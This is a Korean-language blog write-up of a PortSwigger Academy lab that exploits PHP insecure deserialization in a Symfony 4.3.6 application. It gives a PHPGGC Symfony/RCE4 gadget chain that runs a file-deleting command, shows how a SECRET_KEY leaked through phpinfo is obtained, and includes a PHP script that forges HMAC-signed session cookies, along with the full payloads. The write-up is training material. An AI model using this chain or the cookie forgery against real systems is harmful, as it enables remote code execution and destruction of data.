---
title: Insecure Deserialization 실습(6) - PHPGGC를 이용한 Signed Cookie 우회 (PortSwigger Academy)
description: Symfony framework의 gadget chain과 HMAC 서명 우회를 이용해 RCE를 발생시키는 과정 정리
categories: [Web Security, Deserialization, Lab]
tags: [웹 보안, 실습]
toc: true
---

# Lab: Exploiting PHP deserialization with a pre-built gadget chain

Lab Link: [Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)

---

## 핵심 포인트

이 lab은 지금까지 배운 내용이 다 들어간다.

- serialized object  
- gadget chain  
- framework 식별  
- signed cookie 우회  

PHP 환경에서의 deserialization과 관련된 gadget chain을 활용하여 exploit 해보자.

---

## 실습 흐름

### 1. 로그인 및 cookie 확인

로그인 후 요청을 보면  
session cookie가 있다.

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab6-0.png" alt="설명" width="800">
</div>

Inspector로 보면 구조가 이렇게 되어 있다.

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab6-1.png" alt="설명" width="400">
</div>


- URL 인코딩 포맷
- Base64 인코딩된 token  
- HMAC-SHA1 서명 포함  

토큰 값을 살펴보자.

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ0bXBta
TVyaHBseGo1MHNleGVvcG1qN3d5NGdtMzh4OSI7fQ==
```

해당 토큰을 Burp Decoder로 확인 해보면, PHP serialized object를 사용하는것을 확인할 수 있다.

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab6-2.png" alt="설명" width="600">
</div>

먼저 `username`값을 `wiener`에서 `administrator`로 변경하고 `access_token` 타입을 String에서 Integer로 변경해서 우회 가능한지 테스트 해보자.

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab6-3.png" alt="설명" width="600">
</div>


최종 쿠키 헤더 값:

```
%7B%22token%22%3A%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9%22%2C%22sig_hmac_sha1%22%3A%2216d00da92b337deda60c9fafcf91b5279283c16b%22%7D
```

이 값을 `Cookie: Session=`헤더에 넣어주고 요청을 보낸다.

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab6-4.png" alt="설명" width="600">
</div>

### 2. 내부 구조 확인

응답을 확인 해보면 에러메세지와 함께 `Symfony Version: 4.3.6`을 사용하는것을 확인할 수 있다.

PHPGGC를 활용해서 pre-built gadget chain payload를 만들어 보자.  
PHPGGC Github 링크: [PHPGGC Github](https://github.com/ambionics/phpggc)

해당 문서에서 사용법을 숙지한 후에 다음 단계로 진행 하면 된다.

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab6-5.png" alt="설명" width="600">
</div>

`./phpggc -l | grep "Symfony"`를 입력하면 Symfony 라이브러리 버전과 관련돼서 사용할 gadget chain목록이 나온다.

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab6-6.png" alt="설명" width="600">
</div>

위 단계에서 확인했듯, 해당 애플리케이션은 **Symfony Version 4.3.6**을 사용하기 때문에  
**Symfony/RCE4**를 사용해서 payload를 만들어준다.

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab6-7.png" alt="설명" width="600">
</div>

위와 같은 syntax를 참조해서 우리의 목표인 `rm /home/carlos/morale.txt` 커맨드를 실행 시켜주자.

```bash
./phpggc Symfony/RCE4 exec "rm /home/carlos/morale.txt" | base64
```

결과:
```
Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==
```

### 3. SECRET_KEY 찾기

이 Application에서는 `HMAC-SHA1` 서명을 포함하고 있다.  
HMAC 구조는 Secret Key 기반이기 때문에, 서버 내부에 반드시 **Key**가 존재한다.

해당 **Key**값은 여러가지 경로를 통해서 획득이 가능하다.
- Debug mode, Config 경로 노출, Stack trace 등 에러 메세지
- .env, .env.bak, .env~ 등 Git 유출/Backup 파일
- /phpinfo.php, /cgi-bin/pipinfo.php 등 phpinfo 노출

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab6-8.png" alt="설명" width="600">
</div>

Lab의 sitemap을 살펴보면, `GET /cgi-bin/pipinfo.php`라는 파일이 같이 요청된걸 확인할 수 있다.
해당 요청을 repeater로 보내서 로그인된 유저 `wiener`의 `Cookie: Session=`헤더를 넣어주고 요청을 전송 해주면  
응답 페이지에 환경 정보가 노출된다.

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab6-9.png" alt="설명" width="800">
</div>

> 요청

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab6-10.png" alt="설명" width="700">
</div>

>응답

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab6-11.png" alt="설명" width="800">
</div>

> 응답 페이지 렌더링 결과

해당 문서에 `SECRET_KEY`라는 정보를 포함하는걸 확인할 수 있다.

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab6-12.png" alt="설명" width="800">
</div>

```
SECRET_KEY = 8qylu7agciv769hto8pci4da9rlusx1k
```

### 4. Signed Cookie 생성

PHPGGC에서 생성된 값과 SECRET_KEY를 가지고 서명을 해줘야 한다.

아래 php 코드를 활용해서 서명 할 수 있다.

서명 예시:

```php
<?php
$object = "PHPGGC에서 생성한 값";
$secretKey = "phpinfo에서 SECRET_KEY";

$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');

echo $cookie;
```

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab6-13.png" alt="설명" width="700">
</div>

적용:

```php
<?php
$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
$secretKey = "8qylu7agciv769hto8pci4da9rlusx1k";

$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');

echo $cookie;
```

만든 `payload.php` 코드를 실행시키면 서명된 Session 쿠키를 반환한다.

```
%7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg%3D%3D%22%2C%22sig_hmac_sha1%22%3A%2233b8bb2581863dd5dd288e0a43231f6a6cbd6727%22%7D
```

<div class="img-left-block">
<img src="/assets/burp_images/deserialization/deserialization_Lab6-14.png" alt="설명" width="800">
</div>

해당 값을 `Cookie:Session=`값에 입력하고 요청을 보내면 `rm /home/carlos/morale.txt` RCE가 성공적으로 수행되고 Lab이 마무리 된다.

## 정리

정리하자면 이 lab은  
gadget chain 생성  
→ secret key 획득  
→ 서명 위조  
→ RCE 실행  
흐름으로 이어진다.

근본적인 취약점은 untrusted data를 deserialize한다는 점이다.  
공격자가 Cookie에 대입한 값을 그대로 역직렬화 했으며,  
Framework 내부에 exploitable한 gadget chain이 존재했다.  
만든 객체가 내부 코드흐름을 타고 `exec()`까지 도달했다.

HMAC서명으로 변조 방지를 하였으나 `SECRET_KEY`가 phpinfo를 통해 노출되어있었고,  
결국 공격자가 서명을 위조해 malicious object를 정상 데이터처럼 전달할 수 있었고,  
RCE까지 실행 가능했다.
